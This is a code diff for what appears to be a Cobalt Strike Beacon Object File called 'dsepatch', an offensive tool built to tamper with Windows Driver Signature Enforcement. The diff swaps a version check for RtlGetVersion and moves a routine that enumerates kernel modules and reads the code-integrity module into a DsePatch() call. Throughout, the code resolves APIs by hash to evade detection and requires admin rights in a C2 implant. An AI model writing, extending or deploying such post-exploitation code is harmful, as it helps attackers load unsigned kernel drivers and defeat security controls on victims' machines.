@@ -24,12 +24,6 @@
 
 D_SEC( A ) VOID BofStart( _In_ PBEACON_API BeaconApi, _In_ PVOID Argv, _In_ INT Argc ) {
 	if ( BeaconApi->BeaconIsAdmin( ) ) {
-		if ( NtCurrentTeb()->ProcessEnvironmentBlock->OSMajorVersion == 6 ) {
-			if ( NtCurrentTeb()->ProcessEnvironmentBlock->OSMinorVersion != 3 ) {
-				BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "Does not support anything older than Windows 8.1" ) ) );
-				return;
-			};
-		};
 
 		INT				LenInf = 0;
 		INT				NamLen = 0;
@@ -65,8 +59,6 @@ D_SEC( A ) VOID BofStart( _In_ PBEACON_API BeaconApi, _In_ PVOID Argv, _In_ INT 
 		PIMAGE_NT_HEADERS		NthHdr = NULL;
 		PIMAGE_SECTION_HEADER		SecHdr = NULL;
 
-		PSYSTEM_MODULE_INFORMATION	ModInf = NULL;
-
 		HKEY				RegKey = NULL;
 
 		PVOID				NtlMod = NULL;
@@ -78,10 +70,10 @@ D_SEC( A ) VOID BofStart( _In_ PBEACON_API BeaconApi, _In_ PVOID Argv, _In_ INT 
 		STARTUPINFOW			StartW;
 		UNICODE_STRING			UniOne;
 		UNICODE_STRING			UniTwo;
-		IMAGE_DOS_HEADER		ModHdr;
 		OBJECT_ATTRIBUTES		ObjAtt;
 		PROCESS_INFORMATION		ProcIn;
 		SECURITY_DESCRIPTOR		SecDes;
+		RTL_OSVERSIONINFOW		OsVers;
 
 		RtlSecureZeroMemory( &ApiTbl, sizeof( ApiTbl ) );
 		RtlSecureZeroMemory( &Parser, sizeof( Parser ) );
@@ -91,6 +83,7 @@ D_SEC( A ) VOID BofStart( _In_ PBEACON_API BeaconApi, _In_ PVOID Argv, _In_ INT 
 		RtlSecureZeroMemory( &ObjAtt, sizeof( ObjAtt ) );
 		RtlSecureZeroMemory( &ProcIn, sizeof( ProcIn ) );
 		RtlSecureZeroMemory( &SecDes, sizeof( SecDes ) );
+		RtlSecureZeroMemory( &OsVers, sizeof( OsVers ) );
 
 		NtlMod = PebGetModule( H_LIB_NTDLL );
 		K32Mod = PebGetModule( H_LIB_KERNEL32 );
@@ -122,6 +115,10 @@ D_SEC( A ) VOID BofStart( _In_ PBEACON_API BeaconApi, _In_ PVOID Argv, _In_ INT 
 		ApiTbl.NtCreateSection              = PeGetFuncEat( NtlMod, H_API_NTCREATESECTION );
 		ApiTbl.RegSetValueExW               = PeGetFuncEat( AdvMod, H_API_REGSETVALUEEXW );
 		ApiTbl.SetThreadToken               = PeGetFuncEat( AdvMod, H_API_SETTHREADTOKEN );
+		ApiTbl.LoadLibraryExA               = PeGetFuncEat( K32Mod, H_API_LOADLIBRARYEXA );
+		ApiTbl.GetProcAddress               = PeGetFuncEat( K32Mod, H_API_GETPROCADDRESS );
+		ApiTbl.RtlGetVersion                = PeGetFuncEat( NtlMod, H_API_RTLGETVERSION );
+		ApiTbl.FreeLibrary                  = PeGetFuncEat( K32Mod, H_API_FREELIBRARY );
 		ApiTbl.RtlEqualSid                  = PeGetFuncEat( NtlMod, H_API_RTLEQUALSID );
 		ApiTbl.LocalAlloc                   = PeGetFuncEat( K32Mod, H_API_LOCALALLOC );
 		ApiTbl._vsnprintf                   = PeGetFuncEat( NtlMod, H_API_VSNPRINTF );
@@ -129,6 +126,14 @@ D_SEC( A ) VOID BofStart( _In_ PBEACON_API BeaconApi, _In_ PVOID Argv, _In_ INT 
 		ApiTbl.LocalFree                    = PeGetFuncEat( K32Mod, H_API_LOCALFREE );
 		ApiTbl.NtClose                      = PeGetFuncEat( NtlMod, H_API_NTCLOSE );
 		ApiTbl.Sleep                        = PeGetFuncEat( K32Mod, H_API_SLEEP );
+
+		OsVers.dwOSVersionInfoSize = sizeof( OsVers );
+		ApiTbl.RtlGetVersion( &OsVers );
+
+		if ( !( OsVers.dwBuildNumber > 9200 ) ) {
+			BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "dsepatch does not support anything below windows 8." ) ) );
+			goto Leave;
+		};
 
 		BeaconApi->BeaconDataParse( &Parser, Argv, Argc );
 		DllNam = BeaconApi->BeaconDataExtract( &Parser, &NamLen );
@@ -305,35 +310,7 @@ D_SEC( A ) VOID BofStart( _In_ PBEACON_API BeaconApi, _In_ PVOID Argv, _In_ INT 
 						) )
 						{
 							if ( ! ApiTbl.NtWaitForSingleObject( ProcIn.hThread, FALSE, NULL ) ) {
-								if ( !( ApiTbl.NtQuerySystemInformation( SystemModuleInformation, NULL, 0, &LenInf ) ) ) {
-									BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not get length of module info." ) ) );
-									goto Leave;
-								};
-								if ( !( ModInf = ApiTbl.LocalAlloc( LPTR, LenInf ) ) ) {
-									BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not allocate module info." ) ) );
-									goto Leave;
-								};
-								if ( !( ApiTbl.NtQuerySystemInformation( SystemModuleInformation, ModInf, LenInf, &LenInf ) >= 0 ) ) {
-									BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not read module information." ) ) );
-								};
-								for ( INT Idx = 0 ; Idx < ModInf->Count ; ++Idx ) {
-									ModStr = C_PTR( U_PTR( ModInf->Module[ Idx ].FullPathName ) + ModInf->Module[ Idx ].OffsetToFileName );
-
-									if ( HashString( ModStr, 0 ) == H_STR_CI ) {
-										if ( ! ApiTbl.NtReadVirtualMemory( 
-													( ( HANDLE ) - 1 ), 
-													ModInf->Module[ Idx ].ImageBase, 
-													&ModHdr, 
-													sizeof( ModHdr ), 
-													NULL
-										) )
-										{
-											BeaconApi->BeaconPrintf( CALLBACK_OUTPUT, C_PTR( G_SYM( "dsepatch: success" ) ) );
-										} else {
-											BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "dsepatch: failure" ) ) );
-										};
-									};
-								};
+								DsePatch( BeaconApi, &ApiTbl );
 							} else {
 								BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "wait was aborted unexpectedly." ) ) );
 								goto Leave;
@@ -412,9 +389,6 @@ Leave:
 		};
 		if ( RegPth != NULL ) {
 			ApiTbl.LocalFree( RegPth );
-		};
-		if ( ModInf != NULL ) {
-			ApiTbl.LocalFree( ModInf );
 		};
 	} else { 
 		BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "beacon is not running as an administrative user." ) ) );
